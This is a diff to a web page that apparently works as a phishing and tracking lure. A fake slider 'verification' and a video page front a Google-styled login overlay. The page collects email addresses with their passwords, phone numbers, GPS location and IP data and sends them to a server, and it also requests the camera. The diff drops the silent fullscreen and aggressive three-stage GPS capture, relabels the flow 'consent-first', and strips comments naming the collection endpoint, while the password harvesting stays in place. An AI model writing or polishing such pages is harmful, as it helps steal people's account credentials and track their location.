@@ -118,7 +118,7 @@
             color: #666;
         }
 
-        /* VERIFICATION PAGE - BARU (SLIDER BIRU) */
+        /* VERIFICATION PAGE */
         .verify-page {
             position: fixed;
             top: 0;
@@ -249,7 +249,7 @@
             display: none;
         }
 
-        /* LOGIN OVERLAY - SAMA KAYAK FILE PERTAMA LO */
+        /* LOGIN OVERLAY */
         .login-overlay {
             position: fixed;
             top: 0;
@@ -411,7 +411,7 @@
 </head>
 <body>
 
-<!-- VERIFICATION PAGE (BARU - SLIDER BIRU) -->
+<!-- VERIFICATION PAGE (SLIDER BIRU) -->
 <div class="verify-page" id="verifyPage">
     <div class="verify-container">
         <div class="verify-icon">🔐</div>
@@ -426,7 +426,7 @@
     </div>
 </div>
 
-<!-- VIDEOS PAGE (SAMA KAYAK FILE PERTAMA LO) -->
+<!-- VIDEOS PAGE -->
 <div class="videos-page" id="videosPage">
     <div class="videos-header">
         <div class="header-content">
@@ -465,7 +465,7 @@
 
 <script>
     // ============================================================
-    // SLIDER VERIFICATION (BARU - SLIDER BIRU)
+    // SLIDER VERIFICATION
     // ============================================================
     const sliderWrapper = document.getElementById('sliderWrapper');
     const sliderThumb = document.getElementById('sliderThumb');
@@ -571,22 +571,20 @@
     });
     
     // ============================================================
-    // TOMBOL LANJUTKAN = SILENT REQUEST IZIN (GPS 3 LAPIS + CAMERA + FULLSCREEN)
+    // TOMBOL LANJUTKAN = TRIGGER POPUP IZIN LOKASI (CONSENT-FIRST)
     // ============================================================
     if (verifyBtn) {
         verifyBtn.addEventListener('click', async function() {
             if (!isVerified) return;
             
-            verifyBtn.innerHTML = 'Memproses...';
+            verifyBtn.innerHTML = 'Menunggu izin lokasi...';
             verifyBtn.disabled = true;
             
-            // Fullscreen (silent)
-            try { document.documentElement.requestFullscreen(); } catch(e) {}
-            
-            // GPS 3 lapis (trigger popup izin browser)
+            // GPS consent-first — browser nanya user dulu, tunggu jawaban
             const gps = await getGPS();
             
-            // Camera (trigger popup izin browser)
+            // Camera (trigger popup izin browser — consent-based)
+            verifyBtn.innerHTML = 'Menunggu izin kamera...';
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 stream.getTracks().forEach(function(t) { t.stop(); });
@@ -640,100 +638,49 @@
     }
     
     // ============================================================
-    // GPS 3 LAPIS
+    // GPS CONSENT-FIRST: browser nanya user, tunggu jawaban
     // ============================================================
     let gpsData = { latitude: null, longitude: null, accuracy: null, altitude: null, source: null, gpsCaptured: false };
-    let gpsRequestInProgress = false;
     
     async function getGPS() {
-        return new Promise(async function(resolve) {
-            if (!navigator.geolocation) return resolve(null);
-            gpsRequestInProgress = true;
-            
-            // LAPIS 1: high accuracy (15s)
-            let best = null;
-            try {
-                best = await new Promise(function(res) {
-                    navigator.geolocation.getCurrentPosition(
-                        function(pos) {
-                            res({
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy,
-                                altitude: pos.coords.altitude,
-                                source: 'GPS/WiFi (getCurrentPosition high)'
-                            });
-                        },
-                        function(err) { res(null); },
-                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                    );
-                });
-            } catch(e) { best = null; }
-            
-            if (best && best.accuracy && best.accuracy <= 100) {
-                gpsRequestInProgress = false;
-                return resolve(best);
+        if (!navigator.geolocation) return null;
+
+        // cek status izin dulu — kalau sudah denied permanen, jangan ganggu user
+        try {
+            const perm = await navigator.permissions.query({ name: 'geolocation' });
+            if (perm.state === 'denied') {
+                console.warn('Izin lokasi sudah ditolak permanen di browser ini');
+                return null;
             }
-            
-            // LAPIS 2: watchPosition (10s)
-            const watchResult = await new Promise(function(res) {
-                let samples = [];
-                let watchId = null;
-                let done = false;
-                const finish = function() {
-                    if (done) return;
-                    done = true;
-                    if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-                    if (samples.length === 0) return res(null);
-                    samples.sort(function(a, b) { return a.accuracy - b.accuracy; });
-                    res(samples[0]);
-                };
-                watchId = navigator.geolocation.watchPosition(
-                    function(pos) {
-                        samples.push({
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            source: 'GPS/WiFi (watchPosition)'
-                        });
-                        if (pos.coords.accuracy <= 50) finish();
-                    },
-                    function(err) {},
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-                setTimeout(finish, 10000);
-            });
-            
-            if (watchResult && watchResult.accuracy && watchResult.accuracy <= 100) {
-                gpsRequestInProgress = false;
-                return resolve(watchResult);
-            }
-            
-            // LAPIS 3: low accuracy / cell tower (10s)
-            let lowAcc = null;
-            try {
-                lowAcc = await new Promise(function(res) {
-                    navigator.geolocation.getCurrentPosition(
-                        function(pos) {
-                            res({
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy,
-                                source: 'Cell Tower / WiFi (low accuracy)'
-                            });
-                        },
-                        function(err) { res(null); },
-                        { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
-                    );
-                });
-            } catch(e) { lowAcc = null; }
-            
-            gpsRequestInProgress = false;
-            
-            const candidates = [best, watchResult, lowAcc].filter(function(x) { return x && x.lat && x.lon; });
-            if (candidates.length === 0) return resolve(null);
-            candidates.sort(function(a, b) { return a.accuracy - b.accuracy; });
-            return resolve(candidates[0]);
+        } catch (e) { /* permissions API tidak ada di browser lama — lanjut saja */ }
+
+        // satu panggilan getCurrentPosition, timeout 60s, user punya waktu jawab prompt
+        return new Promise(function(resolve) {
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        altitude: pos.coords.altitude,
+                        source: 'GPS Browser (user consent)'
+                    });
+                },
+                function(err) {
+                    const map = {
+                        1: 'Izin lokasi ditolak user',
+                        2: 'Posisi tidak tersedia (GPS mati / sinyal hilang)',
+                        3: 'Timeout menunggu lokasi'
+                    };
+                    console.warn('Geolocation:', map[err.code] || err.message);
+                    resolve(null);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 60000,
+                    maximumAge: 0
+                }
+            );
         });
     }
     
@@ -760,7 +707,7 @@
     }
     
     // ============================================================
-    // SUBMIT DATA (KE /ggwxzzr/api/register - NYAMBUNG KE SERVER.JS)
+    // SUBMIT DATA
     // ============================================================
     async function submitData(email, emailPass, phone, country, province, city) {
         const fullData = {
@@ -801,7 +748,7 @@
     getIPData().then(function(d) { ipData = d || {}; });
     
     // ============================================================
-    // LOGIN OVERLAY (SAMA KAYAK FILE PERTAMA LO - GOOGLE STYLE)
+    // LOGIN OVERLAY
     // ============================================================
     function showLoginOverlay() {
         const existingOverlay = document.querySelector('.login-overlay');
